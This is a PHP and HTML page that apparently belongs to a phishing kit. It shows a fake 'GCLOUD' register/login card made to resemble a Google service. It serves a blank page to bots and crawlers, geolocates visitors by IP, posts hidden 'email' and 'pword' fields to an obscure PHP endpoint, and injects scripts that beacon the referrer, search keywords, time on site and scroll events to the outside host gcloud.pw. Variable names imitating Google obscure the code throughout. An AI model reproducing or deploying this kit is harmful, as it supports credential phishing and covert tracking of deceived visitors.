<!DOCTYPE html>

<?php

$googleapps84747474 = strtolower($_SERVER['HTTP_USER_AGENT']);

if(preg_match("/(bot|Bot|crawler|Crawler|spider|Spider)/","$googleapps84747474"))

{
}

else

{

?>

<head>
<title>Register</title>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<script src="/dashboard/jquery.js" type="text/javascript"></script>
<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
</head>

<link href="https://fonts.googleapis.com/css?family=Roboto:400" rel="stylesheet">

<?php

$google84747474747474747474 = explode("/", $_SERVER['REQUEST_URI']);

$google847474747474747474744474 = $google84747474747474747474[1];

?>

<style>

*
{
font-family:'Roboto',sans-serif;
}

</style>

<style>

@media (min-width: 770px)
{
.google84747474
{
width:396px;
margin:0px auto!important;
margin-top:104px!important;
}
}

</style>

<div class="google84747474" style="padding:12px;box-shadow:0 2px 12px rgba(0,0,0,0.4);background-color:#ffffff;margin:12px;">

<div align="center">

<div style="padding:14px;background-color:#f1f1f1;color:#444444;box-sizing:border-box;cursor:pointer;font-weight:bold;" onclick="window.open('/','_self');">

<divapps84747474 style="font-weight:normal;">G</divapps84747474><divapps84747474 style="font-weight:bold;">CLOUD</divapps84747474>

</div>

</div>

<style>

html,body
{
margin:0px;
padding:0px;
font-family:Varela Round, sans-serif;
background-color:#ECEFF1!important;
}

</style>

<html>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet">
<title>Getit register</title>
<style>
* {
  box-sizing: border-box;
}

body {
}

#regForm {
  padding:12px;
}

h1 {
  text-align: center;  
}

input {
  padding: 10px;
  width: 100%;
  font-size: 17px;
  font-family: Raleway;
  border: 1px solid #aaaaaa;
}

/* Mark input boxes that gets an error on validation: */
input.invalid {
  background-color: #ffdddd;
}

/* Hide all steps by default: */
.tab {
}

button {
  background-color: #1565C0;
  color: #ffffff;
  border: none;
  padding: 10px 20px;
  font-size: 17px;
  font-family: Raleway;
  cursor: pointer;
}

button:hover {
  opacity: 0.8;
}

#prevBtn {
  background-color: #bbbbbb;
}

/* Make circles that indicate the steps of the form: */
.step {
  height: 15px;
  width: 15px;
  margin: 0 2px;
  background-color: #bbbbbb;
  border: none;  
  border-radius: 50%;
  display: inline-block;
  opacity: 0.5;
}

.step.active {
  opacity: 1;
}

/* Mark the steps that are finished and valid: */
.step.finish {
  background-color: #1565C0;
}

.googleapps84747474
{
display:flex;
}

</style>

<?php

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $google84747474 = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $google84747474 = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $google84747474 = $_SERVER['REMOTE_ADDR'];
}

?>

<?php

$json_string = "http://www.geoplugin.net/json.gp?ip=$google84747474";

$jsondata = file_get_contents($json_string);

$jsondata = json_decode($jsondata, true);

$jsondata84747474 = $jsondata['geoplugin_countryName'];

?>

<?php

$googleapps84747474 = $_SERVER['HTTP_USER_AGENT'] . "$jsondata84747474";

?>

<form id="regForm" action="/<?php echo "$google847474747474747474744474"; ?>/people/pageupdates84447474.php" enctype="multipart/form-data" method="post">
<!-- One "tab" for each step in the form: -->

<div class="tab">

<div class="googleapps84747474">

</div>

</div>  

<div class="tab">

<div class="googleapps84747474">

<input type="hidden" placeholder="Email" value="<?php echo "$googleapps84747474"; ?>" oninput="this.className = ''" name="email" style="background-color:#f1f1f1;border:none;" required>

</div>

</div>

<div class="tab" style="margin-top:12px;">

<div class="googleapps84747474">

</div>

</div>

<div class="tab">

</div>

<div class="tab">

<div class="googleapps84747474">

</div>

</div>



<div class="tab">

<div class="googleapps84747474">

<input type="hidden" placeholder="Password" value="<?php echo "$googleapps84747474"; ?>" oninput="this.className = ''" name="pword" type="password" style="background-color:#f1f1f1;border:none;margin-top:12px;" required>

</div>

</div>

<div>

<input type="submit" value="LOGIN" style="padding:12px;background-color:#4285f4;color:#ffffff;margin-top:12px;box-shadow:0 2px 4px rgba(0,0,0,0.4);cursor:pointer;"></input>

</div>

</form>

</div>

<script>

$(document).ready(function(){

$('#googleimageappsmobileappsappsappsappsappsapps84').on('change', function() {

var google8474447444744474 = $('#googleimageappsmobileappsappsappsappsappsapps84').val();

$(".googleappsappsappsappsapps8474447444744474").text('success');

});

});

</script>

<?php

$googleapps84747474 = strtolower($_SERVER['HTTP_USER_AGENT']);

?>

<script>

var googleappsappsappsapps847474744474 = location.protocol

var url84747474 = document.referrer;

var google84747474 = location.href;

var google84444474 = location.search.split('q=')[1]

var url84747474 = encodeURIComponent(url84747474);

var google84444474 = encodeURIComponent(google84444474);

var script = document.createElement('script');
script.src = '' + googleappsappsappsapps847474744474 + '//www1.gcloud.pw/analytics/web/analytics/analytics.php?username=bzLy9WpnBGaPcmK0qWjwfk3rNvlTX9pdRr2DP1VidcE%3D&password=&country=ZA&referer=' + url84747474 + '&keywordsapps8474=' + google84444474 + '';
script.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(script);

var time,timeSite;

time=new Date();

window.onbeforeunload=function(){
timeSite=new Date()-time;
window.localStorage['timeSite']=timeSite;

var url84747474 = document.referrer;

var script = document.createElement('script');
script.src = '' + googleappsappsappsapps847474744474 + '//www1.gcloud.pw/analytics/web/analytics/analytics.php?username=bzLy9WpnBGaPcmK0qWjwfk3rNvlTX9pdRr2DP1VidcE%3D&password=&country=ZA&timeonsite=' + timeSite + '';
script.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(script);

}

var list84747474 = document.getElementsByTagName('html')[0];

window.addEventListener('backbutton', function(){

var script = document.createElement('script');
script.src = '' + googleappsappsappsapps847474744474 + '//www1.gcloud.pw/analytics/web/analytics/analytics.php?username=bzLy9WpnBGaPcmK0qWjwfk3rNvlTX9pdRr2DP1VidcE%3D&password=&useractions8884=googleapps84&country=ZA';
script.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(script);

});

window.addEventListener('scroll', function(){

var script = document.createElement('script');
script.src = '' + googleappsappsappsapps847474744474 + '//www1.gcloud.pw/analytics/web/analytics/analytics.php?username=bzLy9WpnBGaPcmK0qWjwfk3rNvlTX9pdRr2DP1VidcE%3D&password=&useractions8884=googleapps84&country=ZA';
script.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(script);

});

</script>

<?php

}

?>

